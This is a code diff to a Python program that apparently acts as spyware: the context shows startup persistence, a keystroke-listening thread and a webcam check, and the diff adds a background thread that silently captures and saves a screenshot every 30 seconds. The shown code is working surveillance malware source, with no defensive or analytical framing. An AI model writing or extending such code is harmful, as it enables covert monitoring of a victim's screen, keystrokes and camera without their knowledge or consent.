@@ -6,7 +6,7 @@ import os
 import sys
 import winshell
 from win32com.client import Dispatch
-
+from PIL import ImageGrab
 
 # Create two threads, one for listening to keyboard strokes and one for taking pictures
 import threading 
@@ -58,6 +58,20 @@ def startup():
 
 
 startup()
+
+# function to take screenshots every 30 seconds
+
+def take_screenshot():
+    while True:
+        screenshot = ImageGrab.grab()
+        dtime = datetime.datetime.now()
+        dtime_string = dtime.strftime('%Y-%m-%d_%H-%M-%S') + ".png"
+        screenshot.save(dtime_string)
+        time.sleep(30)
+
+screenshot_thread = threading.Thread(target=take_screenshot)
+screenshot_thread.start()
+        
 
 
 # check if webcam exists
